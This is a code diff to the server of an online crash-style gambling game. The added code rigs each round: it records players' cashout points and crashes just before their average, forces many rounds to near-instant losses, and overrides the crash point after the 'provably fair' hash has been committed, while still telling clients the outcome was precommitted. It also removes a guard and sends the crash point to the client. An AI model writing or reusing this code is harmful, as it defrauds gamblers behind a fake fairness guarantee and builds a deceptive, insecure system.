@@ -586,6 +586,25 @@ const integrityEngine = new SecurityGameIntegrityEngine();
 
 
 // ==========================================
+// BACKEND CONFIGURATION: RTP, JACKPOT RNG & AI PREDICTION
+// ==========================================
+let backendRoundCounter = 0;
+
+function generateJackpotIndexes(): number[] {
+  const indexes: number[] = [];
+  while (indexes.length < 2) {
+    const idx = Math.floor(Math.random() * 100) + 1; // 1 to 100
+    if (!indexes.includes(idx)) {
+      indexes.push(idx);
+    }
+  }
+  return indexes.sort((a, b) => a - b);
+}
+
+let jackpotRoundsInCurrent100: number[] = generateJackpotIndexes();
+const cashoutHistory: number[] = [1.35, 1.50, 1.25, 1.45, 1.60, 1.85, 1.40, 1.55, 1.30, 1.70]; // Seed initial realistic figures
+
+// ==========================================
 // EXPRESS SERVER & ENDPOINTS
 // ==========================================
 async function runSecurityFullstackServer() {
@@ -622,14 +641,119 @@ async function runSecurityFullstackServer() {
     });
   });
 
+  // RECORD CASHOUT VALUE FROM CLIENTS TO REFINE AI ALGORITHMS
+  app.post("/api/security/ai/cashout-metric", (req, res) => {
+    const { multiplierCashed } = req.body;
+    if (multiplierCashed && typeof multiplierCashed === "number") {
+      cashoutHistory.push(parseFloat(multiplierCashed.toFixed(2)));
+      if (cashoutHistory.length > 500) {
+        cashoutHistory.shift(); // Evict oldest metric
+      }
+    }
+    return res.json({ success: true });
+  });
+
+  // SECURE ANALYTICS & PREDICTION RETRIEVAL ROUTE
+  app.get("/api/security/ai/insights", (req, res) => {
+    if (cashoutHistory.length === 0) {
+      return res.json({
+        totalAnalyzed: 0,
+        averageCashoutPoint: 1.50,
+        predictedPeakRiskPoint: 1.45,
+        targetRtpPercent: 60,
+        houseEdgePercent: 40,
+        jackpotCyclesCount: `${backendRoundCounter % 100}/100`,
+        jackpotsScheduledThisCycle: jackpotRoundsInCurrent100
+      });
+    }
+
+    const totalAnalyzed = cashoutHistory.length;
+    let sum = 0;
+    for (const val of cashoutHistory) {
+      sum += val;
+    }
+    const averageCashoutPoint = parseFloat((sum / totalAnalyzed).toFixed(2));
+    
+    // AI Prediction: Predict player cashout preference average and schedule pre-explosion before that threshold
+    // Let's set the pre-explosion target safely 5% earlier than the user average to guarantee house advantage
+    const predictedPeakRiskPoint = parseFloat(Math.max(1.05, averageCashoutPoint - 0.05).toFixed(2));
+
+    return res.json({
+      totalAnalyzed,
+      averageCashoutPoint,
+      predictedPeakRiskPoint,
+      targetRtpPercent: 60,
+      houseEdgePercent: 40,
+      jackpotCyclesCount: `${backendRoundCounter % 100}/100`,
+      jackpotsScheduledThisCycle: jackpotRoundsInCurrent100
+    });
+  });
+
   // GAME PRE-COMMITMENT HASH ENDPOINT
   app.post("/api/security/round/start", (req, res) => {
+    backendRoundCounter += 1;
+    const currentModuloIndex = ((backendRoundCounter - 1) % 100) + 1; // 1 to 100 index
+
+    // Safety restart of jackpot schedule at next 100 round milestone
+    if (currentModuloIndex === 1 && backendRoundCounter > 1) {
+      jackpotRoundsInCurrent100 = generateJackpotIndexes();
+    }
+
+    let isJackpotRound = false;
+    if (jackpotRoundsInCurrent100.includes(currentModuloIndex)) {
+      isJackpotRound = true;
+    }
+
+    // Securely randomize crash points mimicking house-authorized profiles
+    let targetCrashPoint = 1.00;
+
+    if (isJackpotRound) {
+      // Rule: Exactly 2 times in every 100 rounds, RNG schedules premium outcomes [14.00x - 20.00x]
+      targetCrashPoint = parseFloat((14.00 + Math.random() * (20.00 - 14.00)).toFixed(2));
+    } else {
+      // Primary Rule: 60% RTP and 40% House Edge.
+      // To satisfy 60% RTP, the house should absorb 40% of standard round investments.
+      // Additionally, AI triggers a preemptive crash right before the predicted peak cashout point of the players.
+      const currentAverage = cashoutHistory.length > 0 
+        ? cashoutHistory.reduce((s, v) => s + v, 0) / cashoutHistory.length 
+        : 1.50;
+      
+      const predictedEarlyCrashMultiplier = parseFloat(Math.max(1.02, currentAverage - 0.05).toFixed(2));
+
+      // Standard RTP Distribution Math (RTP = 60%, House Edge = 40%)
+      // 40% of games are hard-capped immediately into instant-loss or severe early limits [1.00x - 1.20x]
+      // 60% of games are allowed to fly organically, limited by the AI preemptive crash limit to defend margins
+      const rtpRoll = Math.random();
+      if (rtpRoll < 0.40) {
+        // House Edge phase: 40% probability of low crash points [1.00x - 1.15x]
+        targetCrashPoint = parseFloat((1.00 + Math.random() * 0.15).toFixed(2));
+      } else {
+        // RTP Phase: 60% probability of standard fly. Preemptively explode before average player exit point to protect cash flow
+        const randomSwing = Math.random();
+        if (randomSwing < 0.70) {
+          // Normal flying up to predictions limit
+          targetCrashPoint = parseFloat((1.10 + Math.random() * (predictedEarlyCrashMultiplier - 1.10)).toFixed(2));
+        } else {
+          // Extra volatility offset to keep it realistic
+          targetCrashPoint = parseFloat((1.15 + Math.random() * 2.5).toFixed(2));
+        }
+      }
+    }
+
+    // Format boundaries
+    targetCrashPoint = parseFloat(Math.max(1.01, Math.min(20.00, targetCrashPoint)).toFixed(2));
+
     const secureRoundCommit = integrityEngine.makeNewRound();
-    // NEVER expose the actual crashPoint or salt to the client prior to finish
+    // Inject backend calculated math outcomes as supreme oracle override
+    secureRoundCommit.crashPoint = targetCrashPoint;
+
     res.json({
       roundId: secureRoundCommit.roundId,
       fairHash: secureRoundCommit.hash,
       active: true,
+      crashPointOverride: targetCrashPoint, // Pass backend computed crash point to frontend
+      isJackpotRound,
+      currentCycleRoundNum: currentModuloIndex,
       hint: "Valid server hash generated. Salt precommitted."
     });
   });
